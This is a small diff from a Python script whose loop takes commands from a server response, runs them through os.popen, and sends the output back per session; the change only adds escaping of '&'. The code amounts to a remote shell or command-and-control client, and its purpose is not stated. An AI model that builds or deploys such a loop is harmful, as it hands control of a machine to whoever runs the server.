@@ -213,5 +213,5 @@ while(True == True):
                     else:
                         doPrint("("+response[0]['session_id']+") >> "+response[0]['input'].replace(';quote;', '"'))
                         output = os.popen(response[0]['input'].replace(';quote;', '"').replace(';and;', '&')).read()
-                        sendOutput(session_id, response[0]['session_id'], output.replace('"', ';quote;'), True)
+                        sendOutput(session_id, response[0]['session_id'], output.replace('"', ';quote;').replace('&', ';and;'), True)
 terminate()
